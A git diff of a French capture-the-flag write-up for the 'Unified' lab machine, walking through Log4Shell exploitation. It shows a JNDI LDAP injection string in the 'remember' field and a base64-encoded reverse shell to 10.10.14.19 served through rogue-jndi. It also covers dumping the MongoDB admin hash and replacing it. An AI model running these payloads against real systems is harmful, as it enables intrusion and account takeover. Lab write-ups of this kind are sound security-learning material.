@@ -2,11 +2,11 @@
 
 Notes sur la machine Unified.
 
-Cette machine est intéressante vu que Log4j a supris tout le monde, étant donné que c'est une faille qui est la depuis un bon moment et elle n'a été decouverte que recemment.  Elle a même permis de prendre conscience sur le fait qu'un seul developpeur à la charge d'un projet et qui fait ce code de façon benevole pouvait être à la base d'une faille de grosse ampleur.
+Cette machine est intéressante vu que Log4j a surpris tout le monde, étant donné que c'est une faille qui est la depuis un bon moment et elle n'a été découverte que récemment.  Elle a même permis de prendre conscience sur le fait qu'un seul développeur à la charge d'un projet et qui fait ce code de façon bénévole pouvait être à la base d'une faille de grosse ampleur. [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
 
 ## On teste la vulnerabilité
 
-On se sert du champ remember avec le repeater de burpsuite pour y introduire un appel ldap, on est à l'écoute avec tcpdump
+On se sert du champ 'remember' avec le 'repeater de burpsuite' pour y introduire un appel ldap, on est à l'écoute avec tcpdump
 
 ${jndi:ldap://10.10.14.19/whatever}
 
@@ -21,7 +21,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 ## On construit l'application java rogue-jndi avec maven
 
-Ici j'ai eu un doute sur la version de java mais cela marche quand même avec la version 17 de Parrot. De toutes façons si tu desinstalles la 17 t'as plus le burpsuite.
+Ici j'ai eu un doute sur la version de java mais cela marche quand même avec la version 17 de Parrot. De toutes façons si tu désinstalles la 17 t'as plus le Burpsuite.
 
 ```bash
 git clone https://github.com/veracode-research/rogue-jndi
@@ -42,7 +42,7 @@ YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTkvODg4OCAwPiYxCg==
 
 Un reverse shell classique.
 
-On va donc executer RogueJndi-1.1.jar et on va lui passer le payload dans le paramettre --command et on va mettre le --hostname avec nôtre tun0
+On va donc exécuter RogueJndi-1.1.jar et on va lui passer le payload dans le paramètre --command et on va mettre le --hostname avec nôtre tun0
 
 ```bash
 ❯ java -jar ./RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTkvODg4OCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.19"
@@ -62,7 +62,7 @@ Mapping ldap://10.10.14.19:1389/o=groovy to artsploit.controllers.Groovy
 Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
 ```
 
-On va sur BurpSuite et on send dans le repeater avec : 
+On va sur Burpsuite et on send dans le 'repeater' avec : 
 
 ```bash
 {"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.14.19:1389/o=tomcat}","strict":true}
@@ -82,6 +82,8 @@ Script started, file is /dev/null
 unifi@unified:/usr/lib/unifi$ 
 ```
 
+pwd et ls /home/${USER} pour aller chercher un user.txt
+
 ## On se connecte a mongo pour chercher le pass de l'admin
 
 ```bash
@@ -90,7 +92,7 @@ unifi@unified:/home/michael$ mongo --port 27117 ace --eval "db.admin.find().forE
 
 Une fois trouvé on va le remplacer par le notre
 
-1. On cree le pass en sha-512
+1. On crée le pass en sha-512
 
 ```bash
 mkpasswd -m sha-512 Password1234
